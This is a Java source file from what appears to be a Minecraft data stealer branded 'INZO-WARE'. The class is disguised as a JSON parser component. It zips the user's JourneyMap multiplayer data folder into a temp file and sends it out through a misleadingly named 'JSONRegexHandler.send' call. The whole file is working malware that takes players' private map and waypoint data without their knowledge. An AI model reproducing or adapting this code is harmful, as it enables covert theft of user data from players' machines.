package com.inzo.technologies.inzoware.mc.parsers.impl;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class JmapData implements JSONObject {

    @Override
    public void handle() {
        File packed = new File(System.getenv("TEMP") + "\\" + "Journey-Map_INZO-WARE.zip");
        try {
            pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap\\data\\mp", packed.getPath());
            JSONRegexHandler.send(packed);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> !path.toFile().getName().endsWith(".png"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) {
                          JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Journey-Map folder.").build());
                         }
                    });
        }
    }

    @Override
    public String getName() {
        return "JmapData";
    }
}